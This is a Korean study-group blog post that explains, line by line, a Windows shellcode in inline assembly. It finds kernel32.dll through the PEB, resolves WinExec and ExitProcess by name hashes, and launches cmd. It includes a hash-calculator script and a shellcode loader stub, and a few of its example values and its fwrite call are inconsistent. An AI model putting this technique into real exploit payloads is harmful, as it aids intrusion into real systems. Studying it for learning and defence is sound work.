---
layout: post
title: SUA 시스템 해킹 스터디
---

### 170910 6주차

지난 시간에 이어서 어셈블리어로 작성된 아래 기계어 코드로 쉘코드를 살펴보자.

- **universal_shellcode.cpp**

```
#include "stdafx.h"

void main()
{
	__asm{
		jmp start

get_func_addr:
		// get name table index
    // 함수명 테이블 인덱스를 구함
 loop_ent:
		inc edx  // index++
		lodsd    // eax = *esi , esi += 4
		pushad
		add	ebx, eax  
		mov	esi, ebx  
		xor eax, eax  
		xor edi, edi  
 hash:
		lodsb    // eax = *esi, esi += 1   
		add edi, eax  // edi += char
		test al, al
		jnz hash
		mov [ebp+0x10], edi
		popad
		cmp [ebp+0x10], edi // cmp export name hash, 함수 Hash값 비교
		jne loop_ent		
		// get WinExec address
		movzx edx, word ptr [ecx+edx*2-2]	// Ordinal
		mov edi, [ebp+0x18]
		mov esi, [edi+0x1c]  	// Export Address Table
		mov edi, ebx
		add esi, edi		// Address Table
		add edi, [esi+edx*4]
		mov eax, edi
		// edi = 함수 주소 리턴
		ret

start:
		// cmd 문자열
		xor eax, eax
		mov [ebp+0xc], eax  
		mov [ebp+0xc], 0x63 // c
		mov [ebp+0xd], 0x6d // m
		mov [ebp+0xe], 0x64 // d

		// kernel32.dll base address 구함
		mov eax, fs:[eax+0x30]   // PEB
		mov eax, [eax+0xc]   // PEB_LDR_DATA
		mov eax, [eax+0x14]  // .exe InMemoryOrderModuleList
		mov ebx, [eax]       // ntdll.dll InMemoryOrderLinks
		mov ebx, [ebx]       // kernel32.dll InMemoryOrderLinks
		mov ebx, [ebx+0x10]	 // ebx = kernel32.dll base address

		// export table
		mov edi, [ebx+0x3c]  // PE Header
		add edi, ebx
		mov edi, [edi+0x78]	 
		add edi, ebx
		mov [ebp+0x18], edi  // Export Directory
		mov esi, [edi+0x20]  // Export Name Table
		add esi, ebx
		mov ecx, [edi+0x24]	  
		add ecx, ebx         // Ordinal Table
		xor edx, edx
		pushad

		// WinExec 함수 주소 구함
		xor edi, edi
		mov di, 0x2b3
		call get_func_addr
		mov	[ebp+0x20], eax
		popad

		// ExitProcess 함수 주소 구함
		xor edi, edi
		add di, 0x479
		call get_func_addr
		mov	[ebp+0x24], eax

		// call WinExec, WinExec 실행
		xor eax, eax  // eax = 0
		push eax
		lea	eax, [ebp+0xc]  // cmd
		push eax
		call [ebp+0x20] // WinExec('cmd',0)

    // ExitProcess 실행
		xor eax,eax
		push eax
		call [ebp+0x24] // ExitProcess(0)
	}
}
```
> 위 코드를 컴파일하면 정상적으로 WinExec 함수를 호출하여 cmd 창이 실행된다.

위 코드를 한 단계씩 설명하겠다. 요약하자면 아래와 같다.

- **(1) kernel32.dll Base 주소 값을 얻어온다.**
- **(2) Export Directory, Name, Ordinals, Address Table 주소를 구한다.**
- **(3) (2)를 이용하여 WinExec 함수의 주소를 구한다.**
- **(4) (2)를 이용하여 ExitProcess 함수의 주소를 구한다.**
- **(5) WinExec('cmd', 0) 함수를 실행한다.**
- **(6) ExitProcess(0) 함수를 실행한다.**
> 참고로, ExitProcess 함수는 쉘코드 실행 후, 에러 메시지를 띄우지 않고 정상적으로 프로세스를 종료시키기 위해서다.

우선 첫 부분에 나오는 내용을 보자.

```asm
void main()
{
  __asm{
    jmp start
  }
```
> 처음에 시작할 때 start로 점프하여 start를 수행한다.

```asm
start:
		// cmd 문자열
		xor eax, eax
		mov [ebp+0xc], eax  
		mov [ebp+0xc], 0x63 // c
		mov [ebp+0xd], 0x6d // m
		mov [ebp+0xe], 0x64 // d
```
> 나중에 실행할 WinExec 함수의 인자값으로 사용할 c, m, d 문자열을 스택에 저장, 널바이트를 제거하기 위해 xor을 이용

```asm
// kernel32.dll base address 구함
mov eax, fs:[eax+0x30]   // PEB
mov eax, [eax+0xc]   // PEB_LDR_DATA
mov eax, [eax+0x14]  // .exe InMemoryOrderModuleList
mov ebx, [eax]       // ntdll.dll InMemoryOrderLinks
mov ebx, [ebx]       // kernel32.dll InMemoryOrderLinks
mov ebx, [ebx+0x10]	 // ebx = kernel32.dll base address
```
> 위 코드는 이전에 WinDBG로 실습하면서 kernel32.dll의 Base 주소를 구하는 부분이다. 해당 코드를 수행하고 나면, ebx에 kernel32.dll의 Base 주소가 저장된다. 참고로, 이 주소는 ASLR로 인해 재부팅하면 변경될 수 있다.

> ASLR은 메모리 보호 기법 중 하나로, 메모리상의 공격을 어렵게 하기 위해 스택이나 힙, 라이브러리 등의 주소를 랜덤으로 프로세스 주소 공간에 배치함으로써 실행할 때 마다 데이터의 주소가 바뀌게 하는 기법이다.

```asm
// export table
mov edi, [ebx+0x3c]  // PE Header
add edi, ebx
mov edi, [edi+0x78]	 
add edi, ebx
mov [ebp+0x18], edi  // Export Directory
mov esi, [edi+0x20]  // Export Name Table
add esi, ebx
mov ecx, [edi+0x24]	  
add ecx, ebx         // Ordinal Table
xor edx, edx
pushad
```
> Base 주소를 구하면, Offset을 더해서 Export Directory Table, Export Name Table, Ordinals Table, Export Address Table을 구할 수 있다. 우선, Export Directory 주소값을 구하고 edi 레지스터와 스택(*ebp+18*)에 저장한다.

> Export Name Table 주소값은 esi 레지스터에 저장하고, Export Orindal Table의 주소값은 ecx 레지스터에 저장한다. 이제 함수 주소를 찾는 코드로 점프한다.

```asm
// WinExec 함수 주소 구함
xor edi, edi
mov di, 0x2b3
call get_func_addr
mov	[ebp+0x20], eax
popad

// ExitProcess 함수 주소 구함
xor edi, edi
add di, 0x479
call get_func_addr
mov	[ebp+0x24], eax
```
> get_func_addr 함수로 점프하기 전에, 인자값으로 0x2b3, 0x479를 넣는 것을 볼 수 있다. 이 값들은 바로 WinExec 함수의 Hash값이다.

여기서 왜 Hash값이 필요할까?
함수명을 통해 찾으려는 함수의 EAT(*Export Address Table*) 인덱스 값을 구해야 한다. 함수명 길이가 너무 긴 것도 있어서 어셈블리어로 구현하기 적절하지 않고, 함수명의 Hash값을 비교하는 것이 훨씬 쉽기 때문이다. 이는 함수명을 구분하는 특정 연산값을 이용하는 것으로 아래와 같은 과정을 가지고 있다.

- **(1) 찾으려고 하는 함수명의 Hash값을 확인한다. 위 예제에서는 0x1a7이다.**
- **(2) Export Name Table을 구한 뒤 첫 번째 함수명의 Hash값을 구한다.**
- **(3) 구하려는 함수의 Hash값 0x1a7과 위 예제 첫 번째 함수명 Hash값 0x1bc를 비교한다.**
- **(4) 서로 동일하지 않다면 두 번째 함수명 Hash값과 비교한다.**
- **(5) 세 번째 함수명이 0x1a7임을 확인한다.**
- **(6) 찾으려는 함수의 인덱스 값이 2임을 확인한다.**

이 Hash값은 단순히 각 함수명 문자의 ASCII값을 더한 값이다. 그래서 아래와 같이 간단히 어셈블리어로 구현할 수 있다.

```asm
hash:
   lodsb    // eax = *esi, esi += 1   
   add edi, eax  // edi += char
   test al, al
   jnz hash
```
> lodsb는 esi 레지스터의 값을 불러와서 eax에 저장시킨 뒤, esi를 1 더하는 명령으로 문자열 연산에서 쓰이는 명령어다. 여기서는 문자열의 한 글자씩 eax로 로드하는 역할을 하며, 한 글자씩 루프를 돌며 edi 레지스터에 ASCII값을 더한다.

그럼 다음과 같은 결과가 나온다.

`hash(WinExec) = w + i + n + E + x + e + c = 0x57 + 0x69 + 0x6e + 0x45 + 0x78 + 0x65 + 0x63 = 0x2b3`

사실 여기까지의 과정에서 우리에게 필요한 건 함수의 Hash값이다. 아래 Python 스크립트를 사용하면 각 함수들의 Hash값을 쉽게 구할 수 있다.

- **hash_calc.py**

```python
import sys
import pefile

def usage():
	print " Usage) %s [dll]" % sys.argv[0]
	print " ex) %s kernel32.dll" % sys.argv[0]

def get_hash(srcstr):   # Hash값 계산
	hashstr = 0
	for i in srcstr:
		hashstr += ord(i)
	return hex(hashstr)

if len(sys.argv) < 2:
	usage()
	sys.exit()

pe = pefile.PE(sys.argv[1])
print "%-10s\t%-35s\t%-5s\t%-6s" % ("Address", "Name", "Ordinal", "Hash")
for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
   print "%-10s\t%-35s\t%-5s\t%-6s" % (hex(pe.OPTIONAL_HEADER.ImageBase + exp.address), exp.name, exp.ordinal, get_hash(exp.name))
```
> 위 스크립트를 실행하면 함수의 Hash값이 나온다.

이제 get_func_addr 함수를 살펴보자. 입력값은 함수의 Hash값이고, 목적은 함수의 주소를 구하는 것이다. 먼저, Export Name Table을 따라서 함수명을 하나씩 가져온 뒤, 함수명에 대한 Hash값을 하나씩 계산한다.

```asm
get_func_addr:
		// get name table index
    // 함수명 테이블 인덱스를 구함
 loop_ent:
		inc edx  // index++
		lodsd    // eax = *esi , esi += 4
		pushad
		add	ebx, eax  
		mov	esi, ebx  
		xor eax, eax  
		xor edi, edi  
 hash:
		lodsb    // eax = *esi, esi += 1   
		add edi, eax  // edi += char
		test al, al
		jnz hash
		mov [ebp+0x10], edi
		popad
		cmp [ebp+0x10], edi // cmp export name hash, 함수 Hash값 비교
		jne loop_ent		
		// get WinExec address
		movzx edx, word ptr [ecx+edx*2-2]	// Ordinal
		mov edi, [ebp+0x18]
		mov esi, [edi+0x1c]  	// Export Address Table
		mov edi, ebx
		add esi, edi		// Address Table
		add edi, [esi+edx*4]
		mov eax, edi
		// edi = 함수 주소 리턴
		ret
```
> ebx에 함수명이 저장되어 있고 함수명에 대한 Hash값을 계산하면 그 Hash값은 edi에 저장된다. 이 때 WinExec 함수인지 확인하는 것이다.

> 이 과정을 반복해서 서로 동일한 Hash값을 찾으면 루프에서 빠져나온다. 그리고, edx에 저장된 인덱스 값을 이용하여 Ordinal Table에서 EAT의 인덱스 값을 확인한다. 그러면 WinExec 함수의 EAT의 인덱스 값을 알 수 있으며 드디어 WinExec 함수의 Offset을 알 수 있다. 여기에 Base 주소를 더해서 실제 주소를 구하면 끝. ExitProcess 함수도 이와 동일한 과정을 거친다.

> 이제 인자값을 스택에 Push하고 각각 함수를 호출하면 된다. 결과적으로 cmd 프롬프트 창이 열린다. 쉘코드의 바이트 코드(Op Code)를 추출해서 실행해도 정상적으로 동작한다.

```
#include "stdafx.h"
#include "windows.h"

char shellcode[] = "쉘코드";

int _tmain(int argc, _TCHAR* argv[])
{
  int* shell = (int*)shellcode;
  __asm{
    jmp shell
  };
}
```

우리는 이제 함수 주소를 하드 코딩 없이 쉘코드 하나로 다양한 Windows OS에서 사용할 수 있으며, 널바이트가 포함되지 않은 쉘코드를 작성할 수 있다는 것을 확인했다.

<br>
## [질문 내용 정리]

- **IMAGE_EXPORT_DIRECTORY 를 찾기 위해 Base 주소에 DOS_HEADER, IMAGE_FILE_HEADER 크기를 더하는 데, 여기서 DOS_HEADER 크기가 왜 0xf4인가?**

인터넷에 찾아보면 64바이트(*0x40*)라고 나오지만.. 뭔가 덜 더한 것 싶어 DOS_stub 크기를 봤는데, 이 크기는 가변값이라고 함. 가변값인데 모든 컴퓨터에서 동일하게 0xf4를 더할 수 있는 이유는 뭐지?

- **쉘코드 작성 시 OP Code만 따로 추출하는 방법?**

`fwrite(fp, 1, 9999, wmain)`를 사용하자.
